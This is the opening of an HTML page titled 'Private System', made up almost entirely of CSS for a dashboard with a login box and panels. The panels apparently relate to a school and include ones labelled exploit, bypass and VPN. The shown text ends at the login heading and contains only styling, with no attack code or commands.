<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* Global Styles */
    * {
      box-sizing: border-box;
      font-family: var(--font-family, 'Segoe UI', sans-serif); /* Apply custom font if set */
      font-size: var(--base-font-size, 16px); /* Apply custom font size if set */
    }

    /* THE ONE BIG BACKGROUND FOR THE ENTIRE BODY */
    body {
        margin: 0;
        padding: 0;
        background: linear-gradient(135deg, var(--main-bg-start, #0d0d0d) 0%, var(--main-bg-end, #1a1a1a) 100%) !important;
        background-attachment: fixed !important; /* Keep background fixed when scrolling */
        color: var(--main-text-color, #e0e0e0);
        transition: background-color 0.4s, color 0.4s, font-size 0.2s, font-family 0.2s;
        line-height: 1.6;
        overflow-x: hidden;
    }

    body.light-theme {
        --main-bg-start: #f0f0f0;
        --main-bg-end: #dddddd;
        --main-text-color: #333;
        --box-bg-dark: #fcfcfc; /* Now refers to light theme box bg */
        --item-bg-alt-dark: #eee; /* Now refers to light theme alt item bg */
        --panel-bg-dark: #fcfcfc; /* Now refers to light theme panel bg */
        --heading-color-dark: #994d00; /* Now refers to light theme heading color */
        --accent-color: var(--accent-color-light, #994d00); /* Lighter accent for light theme context */
        /* Redefine the gradient for light theme body background */
        background: linear-gradient(135deg, var(--main-bg-start, #f0f0f0) 0%, var(--main-bg-end, #dddddd) 100%) !important;
    }

    :root {
        --accent-color: #ff914d;
        --accent-color-light: #994d00;
        --main-bg-start: #0d0d0d;
        --main-bg-end: #1a1a1a;
        --main-text-color: #e0e0e0;
        --box-bg-dark: #2a2a2a; /* Dark theme box background */
        --item-bg-alt-dark: #3b3b3b; /* Dark theme alternate item background */
        --panel-bg-dark: #2a2a2a; /* Dark theme panel background */
        --heading-color-dark: #ffbf80; /* Dark theme heading color */

        --header-start-color: #ff914d;
        --header-end-color: #ffcc80;

        /* For unified button hover/shadow effects */
        --accent-color-light-hover: #ffb67a; /* Example lighter shade for hover */
        --accent-color-hover-shadow: rgba(255, 145, 77, 0.8); /* Stronger shadow */

        /* NEW: Custom properties for settings */
        --font-family: 'Segoe UI', sans-serif;
        --base-font-size: 16px;
        --ui-animation-speed: 0.3s;
        --button-border-radius: 8px;
        --button-glow-intensity: 0.2;
        --scrollbar-thumb-color: var(--accent-color);
        --scrollbar-track-color: rgba(0,0,0,0.3);
    }

    /* Scrollbar Styling (NEW: Applied if custom scrollbar selected) */
    body.custom-scrollbar::-webkit-scrollbar {
      width: 12px;
      height: 12px;
    }
    body.custom-scrollbar::-webkit-scrollbar-thumb {
      background-color: var(--scrollbar-thumb-color);
      border-radius: 6px;
      border: 3px solid transparent;
      background-clip: padding-box;
    }
    body.custom-scrollbar::-webkit-scrollbar-track {
      background-color: var(--scrollbar-track-color);
      border-radius: 6px;
    }
    body.custom-scrollbar .log-modal-body::-webkit-scrollbar-thumb,
    body.custom-scrollbar .reminder-list-container::-webkit-scrollbar-thumb,
    body.custom-scrollbar .info-panel::-webkit-scrollbar-thumb
     {
      background-color: var(--scrollbar-thumb-color);
      border-radius: 6px;
      border: 2px solid transparent; /* adjust border as needed for embedded elements */
      background-clip: padding-box;
    }
    body.custom-scrollbar .log-modal-body::-webkit-scrollbar-track,
    body.custom-scrollbar .reminder-list-container::-webkit-scrollbar-track,
    body.custom-scrollbar .info-panel::-webkit-scrollbar-track
    {
        background-color: var(--scrollbar-track-color);
        border-radius: 6px;
    }

    /* Loading Screen Styles (Retained) */
    .loading-screen {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: #000;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 9999;
        transition: opacity var(--ui-animation-speed) ease-out; /* Apply anim speed */
        opacity: 1;
    }

    .loading-cube {
        width: 60px;
        height: 60px;
        position: relative;
        transform-style: preserve-3d;
        animation: rotate-cube 4s infinite linear;
    }

    .cube-face {
        position: absolute;
        width: 60px;
        height: 60px;
        border: 2px solid var(--accent-color);
        background: rgba(255, 145, 77, 0.1);
        box-shadow: 0 0 15px var(--accent-color);
    }
    /* Cube face transforms are fine */
    .front  { transform: rotateY(0deg) translateZ(30px); }
    .back   { transform: rotateY(180deg) translateZ(30px); }
    .right  { transform: rotateY(90deg) translateZ(30px); }
    .left   { transform: rotateY(-90deg) translateZ(30px); }
    .top    { transform: rotateX(90deg) translateZ(30px); }
    .bottom { transform: rotateX(-90deg) translateZ(30px); }

    @keyframes rotate-cube {
        from { transform: rotateX(0deg) rotateY(0deg); }
        to   { transform: rotateX(360deg) rotateY(360deg); }
    }

    .loading-text {
        margin-top: 30px;
        font-family: 'Courier New', monospace;
        font-size: 1.5em;
        color: var(--accent-color);
        text-shadow: 0 0 8px var(--accent-color);
    }
     .loading-text.success {
        color: #28a745;
        text-shadow: 0 0 8px #28a745;
     }

    .loading-screen.fade-out {
        opacity: 0;
        visibility: hidden;
    }

    /* Login System Styles (adjusted for square-ish look, etc.) */
    body.login-body {
        background: linear-gradient(135deg, var(--main-bg-start, #0d0d0d) 0%, var(--main-bg-end, #1a1a1a) 100%) !important;
        background-attachment: fixed !important;
        color: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .login-box {
        background: var(--box-bg-dark); /* Use theme-defined box background */
        border-radius: var(--button-border-radius); /* Use dynamic border radius */
        border: 2px solid var(--accent-color);
        box-shadow: 0 0 25px rgba(255, 145, 77, var(--button-glow-intensity)); /* Use dynamic glow */
        width: 400px;
        padding: 40px;
        text-align: center;
        position: relative;
        transition: border-color var(--ui-animation-speed), box-shadow var(--ui-animation-speed), transform var(--ui-animation-speed) ease-in-out;
    }

    .login-box:hover {
        transform: translateY(-5px);
        box-shadow: 0 5px 25px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.8));
    }

    .login-box.flashing {
        animation: flashRed var(--ui-animation-speed) ease-in-out 2;
    }

    @keyframes flashRed {
        0%, 100% { border-color: #ff4c4c; box-shadow: 0 0 18px #ff4c4c; }
        50% { border-color: var(--accent-color); box-shadow: 0 0 10px rgba(255, 145, 77, 0.6); }
    }

    .login-box h2 {
        font-size: 1.8em;
        margin-bottom: 25px;
        font-family: 'Courier New', monospace;
        color: var(--heading-color-dark); /* Use theme-defined heading color */
        letter-spacing: 1px;
    }

    .login-box input {
        width: 100%;
        padding: 14px;
        margin-bottom: 18px;
        background: #2b2b2b;
        border: 1px solid #444;
        color: #fff;
        border-radius: 10px;
        font-size: 1.05em;
        transition: border-color var(--ui-animation-speed), box-shadow var(--ui-animation-speed);
    }

    .login-box input:focus {
        border-color: var(--accent-color);
        box-shadow: 0 0 8px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.8));
        outline: none;
    }
    
    .show-password-container {
        display: flex;
        align-items: center;
        justify-content: flex-start;
        margin-bottom: 20px;
        cursor: pointer;
        user-select: none;
    }
    .show-password-container span {
        font-size: 0.95em;
        color: #cccccc;
        margin-left: 12px;
    }
    .show-password-container input[type="checkbox"] {
        appearance: none;
        width: 40px;
        height: 20px;
        background-color: #555;
        border-radius: 10px;
        position: relative;
        cursor: pointer;
        transition: background-color var(--ui-animation-speed);
        flex-shrink: 0;
    }
    .show-password-container input[type="checkbox"]::before {
        content: '';
        position: absolute;
        left: 2px;
        top: 2px;
        width: 16px;
        height: 16px;
        background-color: white;
        border-radius: 50%;
        transition: transform var(--ui-animation-speed);
    }
    .show-password-container input[type="checkbox"]:checked {
        background-color: var(--accent-color);
    }
    .show-password-container input[type="checkbox"]:checked::before {
        transform: translateX(20px);
    }

    /* NEW: Unified Orange Button Styling - All buttons transparent backgrounds, controlled by CSS variables */
    .login-box button,
    .action-button,
    .quickbar-container button,
    .button-grid-container .box button,
    .button-grid-container .box a,
    .handbook-buttons a, .links-list a, .exploit-buttons a, .bypass-buttons button,
    .reminder-item button
    {
        background: transparent !important;
        border: 2px solid var(--accent-color) !important;
        color: var(--accent-color) !important;
        padding: 10px 18px;
        border-radius: var(--button-border-radius); /* Use dynamic border radius */
        font-weight: bold;
        cursor: pointer;
        transition: all var(--ui-animation-speed) ease; /* Apply anim speed */
        text-shadow: none;
        box-shadow: 0 0 10px rgba(255, 145, 77, var(--button-glow-intensity)); /* Use dynamic glow */
        text-decoration: none;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
    }

    /* Exception: Panic Button is Red */
    #panicBtn {
        border-color: #ff4c4c !important;
        color: #ff4c4c !important;
        box-shadow: 0 0 10px rgba(255, 76, 76, var(--button-glow-intensity)) !important;
    }

    #panicBtn:hover {
        background-color: rgba(255, 76, 76, 0.2) !important;
        box-shadow: 0 0 15px rgba(255, 76, 76, 0.6) !important;
        color: white !important;
    }

    /* Hover effect for all general buttons */
    .login-box button:hover,
    .action-button:hover,
    .quickbar-container button:hover,
    .button-grid-container .box button:hover,
    .button-grid-container .box a:hover,
    .handbook-buttons a:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover,
    .reminder-item button:hover {
        background-color: rgba(255, 145, 77, 0.1) !important;
        transform: translateY(-3px) scale(1.05);
        box-shadow: 0 5px 20px var(--accent-color-hover-shadow) !important;
        color: white !important;
    }

    /* Active / Clicked state */
    .login-box button:active,
    .action-button:active,
    .quickbar-container button:active,
    .button-grid-container .box button:active,
    .button-grid-container .box a:active,
    .handbook-buttons a:active, .links-list a:active, .exploit-buttons a:active, .bypass-buttons button:active,
    .reminder-item button:active {
        transform: translateY(1px) scale(0.95);
        box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.2) !important;
    }


    .attempt-counter, .error-message {
        margin-top: 15px;
        font-size: 0.9em;
        color: #ff4c4c;
        min-height: 20px;
    }

    /* Dashboard Layout */
    .sticky-top-container {
      position: sticky;
      top: 20px;
      z-index: 10;
    }

    .dashboard-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background: linear-gradient(90deg, var(--header-start-color), var(--header-end-color));
        padding: 18px 30px;
        color: #2a2a2a;
        box-shadow: 0 5px 20px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.4));
        border-radius: 15px 15px 0 0;
        animation: slideInFromTop var(--ui-animation-speed) ease-out; /* Apply anim speed */
        margin-bottom: 0;
    }

    @keyframes slideInFromTop {
        0% { transform: translateY(-100px); opacity: 0; }
        100% { transform: translateY(0); opacity: 1; }
    }

    @keyframes fadeInUp {
        from { opacity: 0; transform: translateY(30px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .dashboard-header h1 { font-size: 1.8em; font-family: 'Orbitron', sans-serif; color: #000; text-shadow: 1px 1px 2px rgba(255,255,255,0.3); } /* Scaled relative to base-font-size */
    .user-info { font-weight: bold; font-size: 1.05em; color: #333; } /* Scaled */
    .version-box { background: #ffd966; padding: 10px 18px; border-radius: 10px; color: #000; font-weight: bold; box-shadow: 0 2px 10px rgba(0,0,0,0.2); font-size: 0.9em;} /* Scaled */

    .quickbar-container {
        display: flex;
        flex-wrap: wrap;
        gap: 10px;
        justify-content: center;
        padding: 10px 20px;
        background: var(--box-bg-dark); /* Now the "big background" for quickbar buttons */
        border-radius: 0 0 15px 15px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        margin-bottom: 25px;
        transition: background-color var(--ui-animation-speed); /* Apply anim speed */
    }

    body.dashboard-body.light-theme .quickbar-container {
        background: var(--box-bg-dark); /* Light theme equivalent background */
        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
    }
    
    .quickbar-container button {
      padding: 10px 18px;
      font-size: 0.9em;
      min-width: 100px;
      white-space: nowrap;
    }

    /* Grid for panel-triggering buttons (each in a box) */
    .button-grid-container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
      gap: 20px;
      margin-top: 20px;
      animation: fadeInUp var(--ui-animation-speed) 0.2s ease-out backwards; /* Apply anim speed */
    }
    .button-grid-container .box {
      display: flex;
      flex-direction: column;
      align-items: stretch;
      justify-content: center;
      padding: 15px;
      border-radius: var(--button-border-radius); /* Apply dynamic border radius */
    }
     .button-grid-container .box button,
     .button-grid-container .box a {
        width: 100%;
        padding: 14px;
        font-size: 1em;
        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
     }

    .main-row {
        display: flex;
        gap: 20px;
        margin-bottom: 20px;
        flex-wrap: wrap;
        animation: fadeInUp var(--ui-animation-speed) 0.6s ease-out backwards; /* Apply anim speed */
    }

    .box {
        background-color: var(--box-bg-dark);
        padding: 25px;
        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
        box-shadow: 0 0 18px rgba(255, 145, 77, var(--button-glow-intensity)); /* Apply dynamic glow */
        min-height: 130px;
        transition: all var(--ui-animation-speed) ease-in-out; /* Apply anim speed */
        flex: 1 1 320px;
        position: relative;
        overflow: hidden;
    }

    .box:hover {
        transform: translateY(-5px);
        box-shadow: 0 5px 22px var(--accent-color-hover-shadow); /* Use pre-calculated shadow */
    }

    body.dashboard-body.light-theme .box {
        background-color: var(--box-bg-dark);
        color: var(--main-text-color);
        box-shadow: 0 0 18px var(--box-shadow-accent-light);
    }

    .box h2 {
        font-size: 1.2em; /* Scaled */
        margin-top: 0;
        margin-bottom: 12px;
        color: var(--heading-color-dark);
        border-bottom: 2px solid rgba(255, 145, 77, 0.5);
        padding-bottom: 8px;
        display: flex;
        align-items: center;
        gap: 10px;
    }

    body.dashboard-body.light-theme .box h2 {
        color: var(--heading-color-dark);
        border-bottom-color: rgba(153, 77, 0, 0.4);
    }

    /* NEW: Fading Notification System (Top Right) */
    #notificationContainer {
        position: fixed;
        top: 90px;
        right: 20px;
        z-index: 1000;
        display: flex;
        flex-direction: column;
        gap: 10px;
        max-width: 300px;
        pointer-events: none; /* Allow clicks to pass through initially */
    }

    .dashboard-notification {
        background-color: rgba(42, 42, 42, 0.9);
        color: var(--main-text-color);
        padding: 12px 18px;
        border-radius: 8px;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        border-left: 3px solid var(--accent-color);
        opacity: 0;
        transform: translateY(10px);
        animation: fadeInNotification var(--ui-animation-speed) forwards; /* Apply anim speed */
        position: relative;
        word-wrap: break-word;
        pointer-events: auto; /* Re-enable clicks for the notification itself */
    }

    .dashboard-notification.fade-out {
        animation: fadeOutNotification var(--ui-animation-speed) forwards 2.5s; /* Fade out after 2.5s, apply anim speed */
    }
    
    @keyframes fadeInNotification {
        to { opacity: 1; transform: translateY(0); }
    }
    
    @keyframes fadeOutNotification {
        from { opacity: 1; transform: translateY(0); }
        to { opacity: 0; transform: translateY(-10px); }
    }

    body.light-theme .dashboard-notification {
        background-color: rgba(250, 250, 250, 0.9);
        color: var(--main-text-color);
        border-left-color: var(--accent-color);
    }

    .notification-close-btn {
        position: absolute;
        top: 5px;
        right: 8px;
        background: none;
        border: none;
        color: #999;
        font-size: 0.9em;
        cursor: pointer;
        padding: 0;
        transition: color var(--ui-animation-speed); /* Apply anim speed */
        pointer-events: auto;
    }
    .notification-close-btn:hover {
        color: white;
    }
    .notification-timestamp {
      display: block;
      font-size: 0.8em;
      color: #999;
      margin-bottom: 5px;
    }

    /* Activity Log Modal */
    .log-modal-overlay {
        display: none; /* Hidden by default */
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.8);
        z-index: 1001;
        justify-content: center;
        align-items: center;
        animation: fadeIn var(--ui-animation-speed) ease-out; /* Apply anim speed */
    }

    .log-modal-content {
        background-color: var(--panel-bg-dark);
        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
        border: 2px solid var(--accent-color);
        box-shadow: 0 0 25px rgba(255, 145, 77, var(--button-glow-intensity)); /* Apply dynamic glow */
        padding: 30px;
        width: 80%;
        max-width: 700px;
        max-height: 80%;
        display: flex;
        flex-direction: column;
        position: relative;
    }
    .log-modal-content h2 {
        color: var(--accent-color);
        margin-top: 0;
        margin-bottom: 20px;
        border-bottom: 1px dashed rgba(255, 145, 77, 0.5);
        padding-bottom: 10px;
        display: flex;
        align-items: center;
    }
    .log-modal-body {
        flex-grow: 1;
        overflow-y: auto;
        border: 1px solid #444;
        background-color: #3b3b3b;
        padding: 15px;
        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
        margin-bottom: 20px;
        color: var(--main-text-color);
    }
    .log-modal-body .log-entry {
        border-bottom: 1px dotted #555;
        padding: 8px 0;
    }
    .log-modal-body .log-entry:last-child {
        border-bottom: none;
    }
    .log-modal-body .log-entry span.timestamp {
        font-size: 0.8em;
        color: #999;
        margin-right: 10px;
        flex-shrink: 0;
    }
    .log-modal-body .log-entry {
        display: flex;
        align-items: flex-start;
        word-break: break-word;
    }
    .log-modal-close-btn {
        position: absolute;
        top: 15px;
        right: 20px;
        font-size: 1.5em;
        font-weight: bold;
        color: var(--accent-color);
        cursor: pointer;
        background: none;
        border: none;
        transition: transform var(--ui-animation-speed); /* Apply anim speed */
    }
    .log-modal-close-btn:hover {
        transform: scale(1.1);
    }


    /* General UI components (adjusted or kept) */
    .calendar { display: grid; grid-template-columns: repeat(7, 1fr); gap: 6px; margin-top: 15px; text-align: center; font-size: 0.9em; } /* Scaled */
    .calendar div { padding: 7px; background: #3f3f3f; border-radius: 5px; transition: background var(--ui-animation-speed), transform 0.1s ease; } /* Apply anim speed */
    .calendar div:hover:not(.today) { transform: translateY(-2px); background: #5a5a5a; }
    .today { background: var(--accent-color) !important; font-weight: bold; color: black; box-shadow: 0 0 10px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.7)); }

    .info-panel {
        display: none;
        background-color: var(--panel-bg-dark);
        padding: 30px;
        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
        margin-top: 25px;
        box-shadow: 0 0 20px rgba(255, 145, 77, var(--button-glow-intensity)); /* Apply dynamic glow */
        animation: fadeInPanel var(--ui-animation-speed) ease-out; /* Apply anim speed */
        transition: background-color var(--ui-animation-speed), box-shadow var(--ui-animation-speed); /* Apply anim speed */
    }
    .info-panel h2 {
      font-size: 1.3em; /* Scaled */
      color: var(--accent-color);
      margin-bottom: 20px;
      border-bottom: 2px solid rgba(255, 145, 77, 0.6);
      padding-bottom: 10px;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    @keyframes fadeInPanel { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

    /* WiFi Color Coding (retained) */
    .wifi-high { color: #4CAF50 !important; font-weight: bold !important; text-shadow: 0 0 5px rgba(76, 175, 80, 0.7); }
    .wifi-medium { color: #ffeb3b !important; font-weight: bold !important; text-shadow: 0 0 5px rgba(255, 235, 59, 0.7); }
    .wifi-low { color: #f44336 !important; font-weight: bold !important; text-shadow: 0 0 5px rgba(244, 67, 54, 0.7); }

    .wifi-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 12px; margin-bottom: 15px; }
    .wifi-grid div:first-child { font-weight: bold; color: var(--heading-color-dark); }
    .wifi-grid div { padding: 10px; background: #3f3f3f; border-radius: var(--button-border-radius); box-shadow: inset 0 0 5px rgba(0,0,0,0.2); font-size: 0.9em;} /* Scaled */
    .wifi-entry { display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 12px; margin-bottom: 10px; align-items: center; }
    .wifi-entry div { padding: 10px; background: #4a2b20; border-radius: var(--button-border-radius); text-align: center; font-size: 0.9em; } /* Scaled */

    /* Special lists (buttons/links within) now inherit global button style */
    .links-list, .handbook-buttons, .exploit-buttons, .bypass-buttons {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 12px;
        margin-top: 18px;
    }
    /* Buttons/Links within these lists implicitly inherit the general orange style, ensure color property */
    .links-list a, .handbook-buttons a, .exploit-buttons a, .bypass-buttons button {
      color: var(--accent-color) !important;
    }
    /* For button/link items hover */
    .links-list a:hover, .handbook-buttons a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover {
      background-color: rgba(255, 145, 77, 0.1) !important;
      color: white !important;
    }

    .ipad-options { display: flex; gap: 12px; margin-top: 18px; }
    .ipad-options button { flex: 1; }
    .ipad-content, .bypass-content {
        display: none;
        background: #3c251d;
        padding: 20px;
        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
        margin-top: 18px;
        color: #ffccb3;
        font-size: 0.95em; /* Scaled */
    }

    /* Reminders Specific Styling */
    .reminder-form { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; align-items: flex-end; }
    .reminder-form input {
      padding: 10px;
      border-radius: var(--button-border-radius); /* Apply dynamic border radius */
      border: 1px solid #444;
      background-color: #3b3b3b;
      color: #e0e0e0;
      font-size: 1em; /* Scaled */
    }
    /* Reminder form buttons inherit global orange style */
    .reminder-form button { /* Styles set by global transparent orange button class */ }
    .reminder-form input[type="text"] { flex: 1 1 180px; }
    .reminder-form input[type="date"], .reminder-form input[type="time"] { flex: 1 1 120px; }
    .reminder-list-container { max-height: 400px; overflow-y: auto; padding-right: 10px; }
    .reminder-item {
      padding: 12px 15px;
      margin-bottom: 8px;
      background: #4a2b20;
      border-radius: var(--button-border-radius); /* Apply dynamic border radius */
      font-size: 0.95em; /* Scaled */
      display: flex; justify-content: space-between; align-items: center; gap: 10px;
    }
    .reminder-item.completed { text-decoration: line-through; opacity: 0.7; background-color: #2b2b2b; }
    /* Reminder item buttons inherit global transparent orange button style */
    .reminder-item button { /* Styles set by global transparent orange button class */ }
    /* Ensure clear button uses global button styling */
    #clearAllRemindersBtn {
      margin-top: 20px;
    }

    /* Stats Panel Styling */
    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
    .stats-item {
        background: #3c251d;
        padding: 15px;
        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
        border-left: 3px solid var(--accent-color);
        font-size: 0.95em; /* Scaled */
    }
    .stats-label { font-weight: bold; color: var(--heading-color-dark); margin-bottom: 5px; }
    .stats-value { font-family: 'Courier New', monospace; font-size: 1.1em; word-break: break-all; }
    
    /* Media Player aspect ratio */
    #youtubePlayer iframe {
        display: block; /* Remove extra space below iframe */
        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
    }

    /* Settings Panel Styles */
    .settings-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
        gap: 20px;
        margin-top: 20px;
    }

    .setting-group {
        background: #3c251d;
        padding: 20px;
        border-radius: var(--button-border-radius); /* Apply dynamic border radius */
        border-left: 4px solid var(--accent-color);
        transition: background-color var(--ui-animation-speed); /* Apply anim speed */
    }
    body.dashboard-body.light-theme .setting-group {
        background: #ffd999;
        border-left-color: var(--accent-color-light);
    }

    .setting-group h3 {
        color: var(--heading-color-dark);
        margin-bottom: 15px;
        border-bottom: 1px dashed rgba(255, 145, 77, 0.4);
        padding-bottom: 8px;
        font-size: 1.1em; /* Scaled */
    }
    body.dashboard-body.light-theme .setting-group h3 {
        color: var(--heading-color-dark);
        border-bottom-color: rgba(153, 77, 0, 0.3);
    }

    .setting-item {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 10px;
        padding: 5px 0;
        font-size: 0.95em; /* Scaled */
    }
    .setting-item label {
        flex: 1;
        margin-right: 15px;
    }

    /* Generic checkbox / toggle style in settings */
    .setting-item input[type="checkbox"] {
        appearance: none;
        width: 35px; /* Slightly wider */
        height: 18px; /* Slightly taller */
        background-color: #777; /* Default background for checkbox */
        border-radius: 9px;
        position: relative;
        cursor: pointer;
        transition: background-color var(--ui-animation-speed);
        flex-shrink: 0;
    }
    .setting-item input[type="checkbox"]::before {
        content: '';
        position: absolute;
        left: 2px;
        top: 2px;
        width: 14px;
        height: 14px;
        background-color: white;
        border-radius: 50%;
        transition: transform var(--ui-animation-speed);
    }
    .setting-item input[type="checkbox"]:checked {
        background-color: var(--accent-color);
    }
    .setting-item input[type="checkbox"]:checked::before {
        transform: translateX(17px); /* Moves it to the right (35px width - 14px circle - 2x2px padding = 17px travel) */
    }
    body.dashboard-body.light-theme .setting-item input[type="checkbox"] {
        background-color: #aaa;
    }
    body.dashboard-body.light-theme .setting-item input[type="checkbox"]:checked {
        background-color: var(--accent-color);
    }


    .setting-item select, .setting-item input[type="range"] {
        background-color: #3b3b3b;
        color: #e0e0e0;
        border: 1px solid #555;
        padding: 5px 8px;
        border-radius: 5px;
        transition: background-color var(--ui-animation-speed), border-color var(--ui-animation-speed);
        font-size: 0.95em; /* Scaled */
    }
    body.dashboard-body.light-theme .setting-item select,
    body.dashboard-body.light-theme .setting-item input[type="range"] {
        background-color: #f8f8f8;
        color: #333;
        border-color: #ccc;
    }

    .setting-item select:focus, .setting-item input:focus {
        outline: none;
        border-color: var(--accent-color);
    }

    .color-picker {
        display: flex;
        gap: 5px;
        align-items: center;
    }
    .color-picker input[type="color"] {
        width: 40px;
        height: 25px;
        padding: 2px;
        border-radius: 5px;
        border: 1px solid #555;
        cursor: pointer;
        background: transparent;
        flex-shrink: 0;
    }

    /* Icon Styling */
    .box h2::before, .info-panel h2::before, 
    .quickbar-container button::before, .button-grid-container button::before { 
        font-family: 'Segoe UI Symbol', sans-serif; 
        margin-right: 8px; 
    }
    
    #activityLogBtn::before { content: '📜'; } /* NEW: Activity Log button icon */

    /* Specific button icons */
    #calendarTitle::before { content: '🗓️'; }
    #updatesNotificationsTitle::before { content: '🔔'; }
    #sessionTime::before { content: '⏳'; }
    #realTimeClock::before { content: '🕒'; }
    #realDate::before { content: '📅'; }
    #notesBtn::before { content: '📝'; }
    #exportNotesBtn::before { content: '💾'; }
    #screenshotBtn::before { content: '📸'; }
    #toggleSectionsBtn::before { content: '↔️'; }
    #fixIssuesBtn::before { content: '⚙️'; }
    #fullScreenBtn::before { content: '💻'; }
    #zoomInBtn::before { content: '➕'; }
    #zoomOutBtn::before { content: '➖'; }
    #restartBtn::before { content: '🔄'; }
    #panicBtn::before { content: '🚨'; }
    #themeToggle::before { content: '🎨'; }
    #logoutBtn::before { content: '👋'; }
    #settingsBtn::before { content: '🛠️'; }
    /* Panel-triggering buttons in the new grid layout */
    .button-grid-container button[onclick*='wifiPanel']::before { content: '📶'; }
    .button-grid-container button[onclick*='ipadPanel']::before { content: '📱'; }
    .button-grid-container button[onclick*='handbookPanel']::before { content: '📚'; }
    .button-grid-container button[onclick*='mapPanel']::before { content: '🗺️'; }
    .button-grid-container button[onclick*='studentWebsitesPanel']::before { content: '🎓'; }
    .button-grid-container button[onclick*='teacherWebsitesPanel']::before { content: '🍎'; }
    .button-grid-container button[onclick*='phoneDirectoryPanel']::before { content: '☎️'; }
    .button-grid-container button[onclick*='cameraPanel']::before { content: '📹'; }
    .button-grid-container button[onclick*='schoolInfoPanel']::before { content: '🏢'; }
    .button-grid-container button[onclick*='exploitPanel']::before { content: '💣'; }
    .button-grid-container button[onclick*='bypassPanel']::before { content: '🔑'; }
    .button-grid-container button[onclick*='vpnPanel']::before { content: '🛡️'; }
    .button-grid-container button[onclick*='gamingPanel']::before { content: '🎮'; }
    .button-grid-container button[onclick*='musicPanel']::before { content: '🎧'; }
    .button-grid-container button[onclick*='keyboardPanel']::before { content: '⌨️'; }
    /* RE-ADDED FEATURES' ICONS */
    .button-grid-container button[onclick*='reminderPanel']::before { content: '⏰'; }
    .button-grid-container button[onclick*='statsPanel']::before { content: '📈'; }
    .button-grid-container button[onclick*='mediaPanel']::before { content: '📺'; }
    /* ADDED BACK CALCULATOR & CONVERTER ICONS */
    .button-grid-container button[onclick*='calculatorPanel']::before { content: '🧮'; }
    .button-grid-container button[onclick*='converterPanel']::before { content: '🔄'; }


    /* H2 Title Icons for Info Panels */
    .info-panel h2[id='wifiPanelTitle']::before { content: '📶'; }
    .info-panel h2[id='ipadPanelTitle']::before { content: '📱'; }
    .info-panel h2[id='handbookPanelTitle']::before { content: '📚'; }
    .info-panel h2[id='mapPanelTitle']::before { content: '🗺️'; }
    .info-panel h2[id='studentWebsitesPanelTitle']::before { content: '🎓'; }
    .info-panel h2[id='teacherWebsitesPanelTitle']::before { content: '🍎'; }
    .info-panel h2[id='phoneDirectoryPanelTitle']::before { content: '☎️'; }
    .info-panel h2[id='cameraPanelTitle']::before { content: '📹'; }
    .info-panel h2[id='schoolInfoPanelTitle']::before { content: '🏢'; }
    .info-panel h2[id='exploitPanelTitle']::before { content: '💣'; }
    .info-panel h2[id='bypassPanelTitle']::before { content: '🔑'; }
    .info-panel h2[id='vpnPanelTitle']::before { content: '🛡️'; }
    .info-panel h2[id='gamingPanelTitle']::before { content: '🎮'; }
    .info-panel h2[id='musicPanelTitle']::before { content: '🎧'; }
    .info-panel h2[id='keyboardPanelTitle']::before { content: '⌨️'; }
    .info-panel h2[id='reminderPanelTitle']::before { content: '⏰'; }
    .info-panel h2[id='statsPanelTitle']::before { content: '📈'; }
    .info-panel h2[id='mediaPanelTitle']::before { content: '📺'; }
    .info-panel h2[id='calculatorPanelTitle']::before { content: '🧮'; }
    .info-panel h2[id='converterPanelTitle']::before { content: '🔄'; }
    .info-panel h2[id='settingsPanelTitle']::before { content: '🛠️'; }
  </style>

  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body class="login-body" id="bodyElement">

    <!-- Loading Screen (with rotating cube animation) -->
    <div id="loadingScreen" class="loading-screen">
      <div class="loading-cube">
        <div class="cube-face front"></div><div class="cube-face back"></div>
        <div class="cube-face right"></div><div class="cube-face left"></div>
        <div class="cube-face top"></div><div class="cube-face bottom"></div>
      </div>
      <span id="loadingText" class="loading-text">Initializing System...</span>
    </div>

    <!-- Login System (redesigned) -->
    <div class="login-box" id="loginBox" style="display: none;">
        <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>
